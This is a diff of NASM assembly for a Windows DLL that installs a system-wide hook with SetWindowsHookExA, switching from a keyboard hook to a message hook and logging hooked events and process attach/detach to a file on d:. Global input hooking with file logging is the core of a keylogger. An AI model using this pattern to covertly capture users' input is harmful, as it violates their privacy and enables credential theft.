@@ -5,6 +5,7 @@ DLL_THREAD_ATTACH equ 2
 DLL_THREAD_DETACH equ 3
 
 WH_KEYBOARD equ 2
+WH_GETMESSAGE equ 3
 
 %macro API 1-*
   %define dll %1
@@ -22,8 +23,11 @@ API msvcrt.dll, fopen, fclose, fprintf
 section .data use32
 
 file_mode db "a+", 0
-file_name db "out.txt", 0
+file_name db "d:/out.txt", 0
 file_fmt db `%08X : %08X\n`, 0
+
+msg_attach db `DLL_PROCESS_ATTACH\n`, 0
+msg_detach db `DLL_PROCESS_DETACH\n`, 0
 
 fd dd 0
 hook dd 0
@@ -94,7 +98,8 @@ install:
   push dword 0 ; thread id
   push dword [module]
   push dword hookFunc ; hook proc
-  push dword WH_KEYBOARD ; hook id
+;  push dword WH_KEYBOARD ; hook id
+  push dword WH_GETMESSAGE ; hook id
   call [SetWindowsHookExA]
   mov [hook], eax
   ret 0
@@ -123,12 +128,41 @@ start:
     ; reason == DLL_PROCESS_ATTACH
     push dword [module]
     call [DisableThreadLibraryCalls]
+
+    push dword file_mode
+    push dword file_name
+    call [fopen]
+    add esp, 8
+
+    cmp eax, 0 ; fd == 0
+    je .nfd1
+    push dword msg_attach
+    push dword eax ; fd
+    call [fprintf]
+    call [fclose]
+    add esp, 8
+    .nfd1:
+
     jmp .end
 
   cmp dword [esp + 8], DLL_PROCESS_DETACH
   jne .end
     ; reason == DLL_PROCESS_DETACH
     call [uninstall]
+
+    push dword file_mode
+    push dword file_name
+    call [fopen]
+    add esp, 8
+
+    cmp eax, 0 ; fd == 0
+    je .nfd2
+    push dword msg_detach
+    push dword eax ; fd
+    call [fprintf]
+    call [fclose]
+    add esp, 8
+    .nfd2:
 
   .end:
   mov eax, 1 ; return TRUE
